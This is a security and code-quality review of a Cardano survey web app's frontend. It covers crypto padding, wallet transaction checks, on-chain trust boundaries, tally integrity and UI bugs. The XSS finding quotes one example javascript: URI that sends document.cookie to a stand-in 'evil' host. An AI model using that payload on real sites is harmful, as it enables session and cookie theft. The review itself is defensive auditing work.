# Tessera `frontend/app` — Full Codebase Review

**Scope:** all of `src/` (~16.5k LOC). I read the security-critical core (`tlock/`, `wallet/`, `data/`, `domain/`, `enrichment/`, `state.tsx`, `config.ts`) line-by-line and ran three focused reviews over the four large UI screens + components, then verified their key claims against the source.

**Overall:** the architecture is genuinely strong. Trust boundaries are deliberate and mostly correct: `decodePayload` gates all Koios input (malformed → skipped, never blanks the snapshot), `content.ts` hash-verifies every fetched anchor and rejects non-`https`/`ipfs` schemes, `pin.ts` computes the anchor hash itself rather than trusting providers, the tlock beacon is BLS-verified, and **there is no `innerHTML`/`dangerouslySetInnerHTML` anywhere** — all chain/IPFS strings reach the DOM as escaped JSX text. The answer sign-vs-show path is sound (preview and submit build from the same reactive state at the same tick; sealed responses re-validate plaintext before encrypting). The findings below are mostly edge cases, one real XSS sink, and a set of trust-display gaps.

## Headline findings

1. **🔴 `anchorHttpUrl` puts an attacker-controlled on-chain URI into an `<a href>` with no scheme guard** (security/XSS) — `Survey.tsx:2573`
2. **🟠 Unverified cancellations are shown as authoritative "cancelled"** — anyone can mark any survey closed in this client (trust boundary) — `survey.ts:93`
3. **🟠 Koios `limit=1000` with no pagination silently truncates the record set → incomplete tallies at scale** — `koios.ts:169`
4. **🟠 Tally counts decode-valid-but-constraint-invalid answers** (over-budget points, out-of-range ratings, duplicate multiselect indices) — `tally.ts`
5. **🟠 Network mismatch blocks the gov-action submit but NOT Create/Respond** — `Create.tsx:422`, `Respond.tsx:1953`

---

## 1. Crypto — `src/tlock/`

This subsystem is the best-reasoned part of the codebase. Padding bound, drand constants, beacon verification, and the seal/reveal round-trip are all correct. CBOR decode correctly reads only the first item so zero-padding is dropped cleanly (`cbor.ts:46`). Three minor items:

**`drand.ts:38-41` — `roundForUnixTime` uses `floor` where the contract needs `ceil`** · bug · **low (latent, currently masked)**
The doc promises "the earliest round that guarantees the deadline has passed," but `Math.floor((unix-GENESIS)/PERIOD)+1` returns a round that publishes _up to `PERIOD-1` (~2.99s) before_ `unix` whenever `unix` isn't exactly on a 3s boundary. Correct formula: `Math.ceil((unix - GENESIS_TIME) / PERIOD) + 1`.
_Why it's only low:_ the sole caller is `autoRevealRound`, which adds `REVEAL_MARGIN_SECONDS = 120` first, so the actual reveal still lands ~117–120s after the deadline — never early relative to survey close. But the function is exported with a contract it doesn't meet; any future direct caller (a manually-entered deadline → round) would unlock early.
_Fix:_ switch to `ceil`, or document that the 120s margin is load-bearing.

**`padding.ts:105-107` + `seal.ts:38-46` — free-text (`custom`) answers defeat the uniform-length padding (size leak)** · security (privacy) · **low–medium (documented)**
`maxAnswerItemSize` counts `custom` as a 1-byte empty string, so a survey with a custom question pads to a size that a real long answer exceeds; `padTo` is then a no-op and that ciphertext is visibly longer, leaking that this respondent wrote more. The header documents this gap honestly, but it's a real confidentiality regression for the one question type where answer _content length_ is most sensitive.
_Fix:_ give custom answers a fixed, generous byte budget in the padding estimate (and reject/​truncate answers beyond it at submit), or round the final plaintext up to a block multiple so small variations don't leak.

**`client.ts:27-34` — a one-time chunk-load failure is cached permanently** · bug · **low**
`instance` memoizes the `import(...)` promise; if it rejects (transient network/chunk error), every later `encryptToRound`/`decryptWithBeacon` reuses the rejected promise with no retry, so a survey can't be sealed/revealed until full reload.
_Fix:_ null out `instance` on rejection so the next call retries.

---

## 2. Wallet & tx — `src/wallet/`

No malleability or sign-vs-show issue in the tx layer itself: `signTx(partialSign)` returns only witnesses, `addVKeyWitnessesHex` merges them without touching the body (txid preserved), and `proveCredentials` correctly forces `required_signers` for the responder/owner key. UTxO parsing validates shape and throws on garbage.

**Network mismatch is enforced inconsistently** · bug/security · **medium** — `Create.tsx:422-433`, `Respond.tsx:1953`, vs `ProposeInfoAction.tsx:261-267`
`ProposeInfoAction` gates `canSubmit` on `!mismatch()` (wallet `networkId` vs `config.network`). **Create** only blocks on `externalNoTokens`, and **Respond**'s `ready()` is purely `decided >= total` — neither checks the network. The header shows a mismatch _warning_, but a user on the wrong network can still click "Sign & publish survey" / "Submit response." The evolution-sdk build will usually fail on the change-address network tag, so it's not a silent wrong-network submission, but the user gets a confusing low-level error instead of the clean block the gov path gives.
_Fix:_ hoist the `mismatch()` predicate to a shared helper (it's copy-pasted in Header and ProposeInfoAction already) and add `!mismatch()` to the Create and Respond submit gates.

**`submit.ts:89-95` uses the static `config.koiosToken`, not the live override** · quality · **low**
The protocol-params GET during tx build reads the build-time token snapshot, while every read path reads the reactive `app.koiosToken()`. A token added in Settings applies to reads but not to this one GET (rate-limit inconsistency only).
_Fix:_ thread the live token getter into `txContext`.

---

## 3. On-chain data — `src/data/`, `src/domain/`

The codec trust boundary (`decodePayload`), the `MAX_DEPTH=64` recursion guard against hostile metadata, deterministic `dedupeResponses` tie-breaking, and the deliberately honest `audit.ts` (only claims after-deadline + superseded, defers credential/role checks to an indexer) are all correct. The issues are about _what gets presented as authoritative_.

**`survey.ts:93-126` — unverified cancellations are treated as authoritative** · security (trust boundary) · **medium**
`cancelledKeys` is built from _every_ cancellation record that merely _references_ a survey ref; `aggregateSurveys` then sets `status: "cancelled"`. The client fetches only metadata (`/tx_metadata`), never the cancelling tx's `required_signers`, so it **cannot** verify the canceller proved the owner credential — and the codec can't either (no ledger context). Result: anyone can publish a label-17 cancellation payload targeting any survey and make it render as **cancelled/closed** for every user of this client (griefing / suppression). The scope note acknowledges this is "indexer-side," but the UI presents it as fact with no "unverified" affordance.
_Fix:_ until an indexer verifies owner-proof, label these "claimed cancellation (unverified)" rather than hard `cancelled`, and/or cross-check the cancelling tx's signers via an extra Koios call.

**`koios.ts:165-170` — `limit=1000`, newest-first, no pagination → silent incomplete data** · bug · **medium**
`fetchAll` pulls the 1000 most-recent label-17 txs network-wide since the cutoff and stops. Responses are label-17 txs in the _same_ set, so once total label-17 volume crosses 1000, older survey definitions or responses are dropped with no warning, and `tallySurvey`/`auditResponses` compute over a partial set — an **authoritative-looking but undercounted tally.**
_Fix:_ paginate (Koios `offset`/`Range`) until exhausted; at minimum detect hitting the cap and surface "results may be incomplete."

**`tally.ts` — constraint-invalid answers are counted** · bug (tally integrity) · **medium**
The audit filters only deadline + superseded, never answer _validity_ against the question. So decode-valid-but-illegal answers skew results:

- `tally.ts:204-207` (multiSelect) counts duplicate indices in one response (`[0,0,0]` adds 3 to option 0) — breaks the "responders" unit.
- `tally.ts:258-264` (points) sums raw `points` with no budget cap → one over-allocated response dominates the average.
- `tally.ts:287` (rating) and `236-244` (numericRange) feed out-of-scale/out-of-range values straight into `sums`/`mean`/`median`.
  The in-app responder builder _does_ validate all of this (`respond.ts:88-143`), so only responses crafted outside this app exploit it — but that's exactly the threat model on a public chain.
  _Fix:_ validate each answer against its question (reuse `respond.ts`'s `numericValid`/`ratingInScale`/selection-count checks) before tallying, and add an `"invalid"` exclusion category to `audit.ts` so the count stays honest.

**`koios.ts:296-325` / Explore — governance link `title` shown as "Advertised by {title}"** · security (trust display) · **low–medium**
`govLink.title` comes from off-chain anchor JSON (untrusted). It's escaped (no XSS), but the only enforced invariant is epoch-alignment (`survey.ts:113`) — _not_ content authenticity. A malicious Info Action can set `title: "Official Cardano Foundation Poll"` to lend a survey false authority.
_Fix:_ present the title as unverified (subtle affordance / length clamp), and soften "Advertised by" which overstates verification.

**Documented low-severity caveats (no action needed, listed for completeness):** `metadatum.ts:66` JSON-number precision loss above 2⁵³; `metadatum.ts:48` text-vs-bytes "0x" ambiguity; `audit.ts:46-55` `epochOfSlot` is a constant-epoch-length estimate near old boundaries. All three are called out in their own doc-comments and are acceptable given the Koios-JSON stopgap.

---

## 4. Enrichment — `src/enrichment/`

`content.ts` is exemplary: hash-verify-then-trust, gateway racing with proper abort/cleanup, explicit scheme allow-list (`ipfs`/`https` only; `data:`/`file:`/`javascript:`/`http:` rejected). `pin.ts` never trusts a provider's hash. The XSS gap is that this same discipline is **not** applied at the one display sink:

**🔴 `Survey.tsx:2573-2577` `anchorHttpUrl` → `Survey.tsx:1772` `<a href>`** · security (DOM XSS) · **high (mitigated in prod by CSP)**
A voter's `rationale.uri` is attacker-controlled on-chain data (the codebase says so itself at `content.ts:117`). `anchorHttpUrl` rewrites `ipfs://` but returns everything else **verbatim**, straight into `href={anchorHttpUrl(anchor())}` on the "rationale ↗" link. A response with `rationale.uri = "javascript:fetch('https://evil/?c='+document.cookie)"` runs script in the app origin when a viewer/auditor clicks it. Solid does not sanitize `href`.
_Mitigation reality:_ `public/_headers` ships a strict CSP (`script-src 'self'`, no `'unsafe-inline'`) that blocks `javascript:` execution, and browsers block top-level `data:` navigation — so a **Cloudflare Pages production build is protected.** But the CSP is environment-specific: it's absent under `vite dev`/`vite preview` and on any non-Cloudflare host, where the sink is live. Relying on CSP as the sole control for a sink you can fix in three lines is the wrong default.
_Fix:_ mirror `content.ts`'s guard — after the `ipfs://` rewrite, `return new URL(u).protocol === "https:" ? u : null`, and render the link only via `<Show when={safeUrl()}>`.

**`ProposeInfoAction.tsx:293-306` / `516-522` — anchor URL is unvalidated and unbound to the hash before signing** · security/integrity · **medium**
The displayed anchor hash is over the loaded/pinned bytes, but the URL field is independent free text written straight into the on-chain `Anchor` (`submit.ts:194`) with no scheme check and no verification that the URL actually serves those bytes. A user can pin one document and submit a different (or `javascript:`/`http:`) URL, producing an on-chain anchor whose hash never matches its URL — and that URL later flows into the same kind of link sink as above.
_Fix:_ validate scheme (`ipfs`/`https` only) before enabling submit; when the doc was pinned this session, warn if the URL was edited away from the returned `res.uri`.

---

## 5. State & UI — `src/state.tsx`, `src/ui/`

`state.tsx` is clean: the pending-tx poller is correctly scoped with `onCleanup`, localStorage is uniformly try/caught, the content cache is content-addressed (immutable, no invalidation), and `displayDefinition` swallows malformed cached docs. The bugs are in the screens.

### Reactivity (highest-value UI bugs)

**`Respond.tsx:150-165` — draft re-seed effect omits `definition()`/`existing()` from its `on(...)` deps** · bug · **medium**
The seed keys only on `[survey()?.key, role()]` but reads `definition()`/`existing()` in the body. So (a) when external-content enrichment resolves and swaps the definition (same key/role), drafts don't re-seed; (b) if the prior on-chain response loads _after_ the first seed, **the user's previous answers silently fail to pre-fill.**
_Fix:_ add `definition()` and `existing()` to the `on(...)` tuple; render the question list from the same `definition()` accessor that seeds (`Respond.tsx:476`).

**`Respond.tsx:106-115` — picking a per-survey response role mutates global `app.setActiveRole`** · bug · **medium**
Choosing "Stakeholder" for one survey rewrites the app-wide active role used by the "mine" Explore filter and other screens.
_Fix:_ drive the per-survey role from a local `roleOverride`; don't write global state from this screen.

**`Survey.tsx:2238-2253` — `SealedResults` reveal resource freezes `props.records` at the reveal instant** · bug · **medium**
The resource is keyed on `revealRound()` (stable once truthy) but reads `props.records` in the fetcher, so the decrypted/​tallied set is pinned to whatever was loaded the moment the round became available; later responses landing in a new snapshot never re-tally.
_Fix:_ key the resource on a cheap fingerprint of the record set (e.g. joined tx hashes) so it re-runs on membership change, not on object identity or the 30s clock tick.

**`Header.tsx:342 — `app.installedWallets()` read once, non-reactively** · bug · **medium**
Wallets inject onto `window.cardano` asynchronously (state.tsx polls 15×200ms for exactly this reason), but the connect menu reads the list once at setup, so a slow-injecting wallet shows "No CIP-30 wallet detected" permanently until remount.
_Fix:_ wrap in `createMemo` and re-read when the menu opens.

**`Settings.tsx:186,190,314 — `storedKoiosToken()` called inside reactive derivations** · bug · **medium**
It reads localStorage, not a signal, so `dirty()` and the "Use app default" `disabled` won't update after save/reset.
_Fix:_ mirror the stored token into a signal (or read the exposed reactive accessor).

**`Respond.tsx:1635-1642 — numeric-range slider bypasses `clampStep`** · bug · **medium**
The number-input path snaps via `clampStep`; the slider does `set(BigInt(e.currentTarget.value))` directly, so on a stepped/non-aligned range it can produce off-step values that `validateResponse` then _blocks_ with no way for the slider to resolve.
_Fix:_ `set(clampStep(BigInt(...), min, max, step))`.

### Sign-vs-show (preview fidelity)

**`Create.tsx:147-159 / 231-234` — Pro on-chain preview shows the placeholder anchor, not the signed one** · security (sign-vs-show) · **medium**
For external-content surveys, `previewPayload` encodes `PLACEHOLDER_ANCHOR` (`ipfs://pending`, 32 zero bytes); the definition is _rebuilt with the real pinned anchor_ at publish. So the single most security-relevant field (the content commitment) differs between what a Pro user inspects and what they sign. OnchainPreview's stated purpose is "exactly what you'll write."
_Fix:_ pin before previewing, or have the preview explicitly mark the anchor as "resolved at publish."

**`Respond.tsx:255-266` — write-mode rationale anchor is absent from the preview but present in the signed payload** · security (sign-vs-show) · **low–medium**. Same class; rationale is informational so lower stakes. _Fix:_ show a placeholder-anchor preview or a "rationale added at submit" note.

**`Create.tsx:135 / 917 — `intOf`=`parseInt` silently coerces the manual drand round** · bug · **low–medium**. `"100abc"→100`, `"1e6"→1`, with no feedback. _Fix:_ use the strict `^\d+$` discipline already in `parseEndEpoch`/`parseBig`.

### Error/loading & accessibility

- **`Header.tsx:300-333` — both dropdowns lack outside-click/Escape close and `onCleanup`** · bug · medium. Once open they only close by re-toggling. _Fix:_ document-level `pointerdown`/Escape listener registered on open, removed in `onCleanup`.
- **`ProposeInfoAction.tsx:293-306` — successful gov submit never calls `app.trackTx`** · bug · medium. Unlike Create, the proposal never appears in the pending indicator. _Fix:_ `trackTx` after `setTxHash` (add a `"govAction"` `PendingKind`).
- **`Respond.tsx:434`, `Explore.tsx:433`, `Survey.tsx` — a snapshot `error` renders as "not found"/empty** · bug · low. A transient Koios failure masquerades as missing data. _Fix:_ branch on `snapshot.error` with a retry.
- **`SubmitProgress.tsx:16-53` — blocking modal has no `role="dialog"`/`aria-modal`/focus trap/`aria-live`** · a11y · medium. Screen-reader users get no announcement. _Fix:_ add the dialog semantics, an `aria-live="polite"` step region, and move focus in on mount.
- **`Create.tsx` (382,499,738,…) — builder buttons lack `type="button"`; role/mode toggles lack `aria-pressed`/`role="radio"`** · a11y · medium. Latent submit-button hazard if a `<form>` is added; toggle state invisible to AT. Icon-only buttons (`Header.tsx:160-189`) need `aria-label`.

---

# Part 2 — Code Quality

**Duplication (the biggest opportunity).** The same patterns are copy-pasted and already drifting:

- **Segmented toggle** (`background:#F1EADC; border:#E3DBC9; …` + on/off button styles) in 4 places: `Header.tsx` (`proStyle`), `Settings.tsx` (`segStyle`), `OnchainPreview.tsx` (`segStyle`), `Respond.tsx:1137`. → extract `<SegmentedToggle>`.
- **Note/callout box** reimplemented in `ProposeInfoAction.tsx` (`noteStyle`) and inline danger lists, when `Feedback.tsx`'s `ProblemList`/`ErrorBox` already exist for this. → use Feedback; extract `<Note kind>`.
- **Spinner ring** redeclared in `SubmitProgress.tsx`, `Header.tsx` (`spinnerStyle`), `PendingRow`. → `<Spinner>`.
- **`ConnectPrompt` / `SubmittedPanel` / `backLinkStyle`** duplicated across `Create.tsx` and `Respond.tsx` (the two `SubmittedPanel`s already differ).
- **`GridRow` vs `CardRow`** in `Explore.tsx` duplicate all derived accessors (`def`/`labelsMissing`/`v`/`closed`/`ends`) and most markup → `useRowModel(props)` hook + shared sub-components.
- **`serializeAnswer` vs `humanizeAnswer`** (`Survey.tsx:2495-2553`) — two parallel `AnswerItem` switches that must stay in sync.
- **Epoch→unix math** in three places (`Explore.tsx:108`, `audit.ts:epochOfSlot`, `survey.ts:governanceSinceUnix`); **`Question.type→label` maps** twice (`create.ts:103` `TYPE_LABELS` vs `Respond.tsx:1145`); **nav list + `isActive`** twice (`Header.tsx`/`BottomNav.tsx`).

**Styling.** ~105 hardcoded hex/rgba literals across `src/ui/` bypass the token system: `#857B6B` (×4), `#F1EADC`/`#E3DBC9` (×4), `#8A3A2E` (Feedback ×2), and `#E7E0D0` — which is _literally_ `var(--line)` — in `Header.tsx:45` and `BottomNav.tsx:42`. Magic radii too (`99px` where `--r-pill: 999px` exists). The screens are otherwise almost entirely inline `style={{…}}`; the static blocks are prime candidates for CSS classes. _Fix:_ add `--toggle-bg/-line/-text-off`, `--shadow-menu`, `--danger-ink`, `--card-bg` tokens; replace `#E7E0D0` with `var(--line)` immediately.

**Component structure.** `Survey.tsx` (2577), `Respond.tsx` (2461), `Create.tsx` (2105), `Explore.tsx` (1278), `Header.tsx` (816) are oversized and mix view with domain logic that should move to `domain/`:

- `Survey.tsx` CSV export (`exportCsv`/`credOf`/`serializeAnswer`/`humanizeAnswer`) → pure `domain/`/`util/` (unit-testable, reusable).
- `ProposeInfoAction.tsx` `validateAnchorShape` (61-116) and the epoch-alignment memo (153-191) are domain logic in a view — and the doc-comment says they "mirror `parseGovLink`," i.e. they should _share_ code, not re-implement it.
- `Create.tsx` `onPublish` (207-267) inlines pin + cache + rebuild + encode + submit + track over closure state → extract `publishSurvey(app, owner, meta, questions)`.

**Consistency / minor.** `SubmitProgress.tsx` exports `SubmitProgressModal` (filename/export mismatch). `ProposeInfoAction.tsx:269-279` `copyHash`/`download` use `setTimeout`/`createObjectURL` without `onCleanup`, diverging from `OnchainPreview.tsx:72` which does it right. `OnchainPreview.tsx:74` `copy()` has no `.catch` (unhandled rejection in an insecure context).

**Dead code.** I could not confirm any of the candidates as truly dead — notably `format.ts:67 roleBrowserClaimable`, which one pass flagged, is **used** in `Respond.tsx:62,660`. The one genuine candidate is the `Cip179Records` re-export at `state.tsx:490` (its own comment admits it's "unused at the type level"); verify before removing.
